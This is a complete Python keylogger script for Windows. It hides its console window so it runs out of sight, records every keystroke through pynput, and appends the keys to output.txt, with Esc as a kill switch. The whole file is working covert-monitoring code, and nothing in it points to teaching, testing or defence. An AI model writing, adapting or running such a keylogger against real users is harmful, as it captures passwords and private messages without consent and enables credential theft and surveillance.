import os
import win32gui
import win32console
from pynput.keyboard import Key, Listener

# Hide console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

log_file = os.path.join(os.getcwd(), "output.txt")

# Define the function to write to the log file
if os.path.exists(log_file):
 try: os.remove(log_file)
 except OSError as e: 
    with open(log_file, 'a') as f: 
        f.write("\n{}".format(e))

def write_to_log(key):
 log_file = os.path.join(os.getcwd(), "output.txt")
 with open(log_file,'a') as f:
  f.write(str(key))     

# Define the function to handle key presses
def on_press(key):
 # Kill switch:
 if key == Key.esc:  
        return False
 try:
  write_to_log(key.char)
 except AttributeError:
        if key == Key.space:
            write_to_log(' ')
        elif key == Key.enter:
            write_to_log('\n')
        else:
            write_to_log('[' + str(key) + ']')

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
